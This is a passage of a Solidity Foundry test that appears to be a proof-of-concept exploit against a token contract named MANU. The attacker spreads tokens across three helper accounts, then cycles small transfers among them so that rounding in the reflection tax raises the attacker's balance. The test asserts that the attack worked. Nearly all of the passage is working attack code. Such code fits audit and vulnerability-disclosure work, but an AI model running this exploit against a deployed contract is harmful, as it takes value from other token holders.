        MANU(TARGET).transfer(helper1, helperAmount);
        MANU(TARGET).transfer(helper2, helperAmount);
        MANU(TARGET).transfer(helper3, helperAmount);

        console.log("After distribution - attacker balance:", MANU(TARGET).balanceOf(attacker));
        console.log("Helper1 balance:", MANU(TARGET).balanceOf(helper1));
        console.log("Helper2 balance:", MANU(TARGET).balanceOf(helper2));
        console.log("Helper3 balance:", MANU(TARGET).balanceOf(helper3));

        // Now perform transfers ONLY between helper accounts
        // Attacker is not involved in these transfers but is a holder
        // Each transfer will distribute tax to attacker (and other holders)

        // Perform multiple small transfers to maximize rounding exploitation
        uint256 smallAmount = 1 * 10**18;

        for (uint256 i = 0; i < 5; i++) {
            // Transfer from helper1 to helper2
            vm.prank(helper1);
            MANU(TARGET).transfer(helper2, smallAmount);

            // Transfer from helper2 to helper3
            vm.prank(helper2);
            MANU(TARGET).transfer(helper3, smallAmount);

            // Transfer from helper3 to helper1
            vm.prank(helper3);
            MANU(TARGET).transfer(helper1, smallAmount);
        }

        // Check final balance
        uint256 finalBalance = MANU(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);
        console.log("Final total supply:", MANU(TARGET).totalSupply());

        // Verify attack succeeded
        assertGt(finalBalance, initialBalance, "Attacker balance should increase from tax distribution");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
